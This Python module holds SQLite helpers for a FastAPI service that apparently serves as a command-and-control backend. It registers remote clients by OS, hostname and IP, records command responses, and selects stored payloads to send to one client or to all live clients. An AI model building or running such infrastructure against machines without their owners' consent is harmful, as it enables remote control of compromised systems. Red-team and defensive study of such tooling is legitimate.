import json
import logging
import sqlite3
from contextlib import contextmanager
from datetime import datetime, timedelta
from typing import Any, Dict

from fastapi import Request
from schema import Message
from settings import CLIENT_LIVELINESS_THRESHOLD_MINUTES, DB_LOCATION


@contextmanager
def sqlite_connection(db_name):
    conn = sqlite3.connect(db_name)
    try:
        yield conn
    finally:
        conn.commit()
        conn.close()


def update_or_insert_client(message: Message, request: Request):
    with sqlite_connection(DB_LOCATION) as db_connection:
        cursor = db_connection.cursor()
        message_id = str(message.identifier)

        cursor.execute("SELECT id FROM clients WHERE id = ?", (message_id,))
        existing_client = cursor.fetchone()
        client_info: Dict[str, Any] = json.loads(message.get_result())
        if existing_client:
            cursor.execute(
                "UPDATE clients SET last_seen = ?, external_ip = ?, port = ? WHERE id = ?",
                (
                    datetime.now(),
                    request.client.host,
                    client_info.get("port"),
                    message_id,
                ),
            )
        else:
            cursor.execute(
                "INSERT INTO clients (id, os, hostname, last_seen, external_ip, port) VALUES (?, ?, ?, ?, ?, ?)",
                (
                    message_id,
                    client_info.get("os"),
                    client_info.get("hostname"),
                    datetime.now(),
                    request.client.host,
                    client_info.get("port"),
                ),
            )


def update_command_status(message: Message):
    with sqlite_connection(DB_LOCATION) as db_connection:
        cursor = db_connection.cursor()
        logging.debug("Got response %s", message.get_result())
        cursor.execute(
            "UPDATE commands SET status = ?, response = ? WHERE id = ?",
            (
                message.status.value,
                message.get_result(),
                str(message.identifier),
            ),
        )


def get_command_arguments(target: str, payload_id: int):
    with sqlite_connection(DB_LOCATION) as db_connection:
        cursor = db_connection.cursor()
        if target == "all":
            liveliness_threshold_delta = datetime.now() - timedelta(
                minutes=CLIENT_LIVELINESS_THRESHOLD_MINUTES
            )
            cursor.execute(
                "SELECT id, external_ip, port  FROM clients WHERE last_seen >= ?",
                (liveliness_threshold_delta,),
            )
            client_result = cursor.fetchall()
        else:
            cursor.execute(
                "SELECT id, external_ip, port  FROM clients WHERE id = ?", (target,)
            )
            client_result = cursor.fetchall()

        cursor.execute(
            "SELECT payload, default_arguments FROM payloads WHERE id = ?",
            (payload_id,),
        )
        payload = cursor.fetchone()

    return client_result, payload
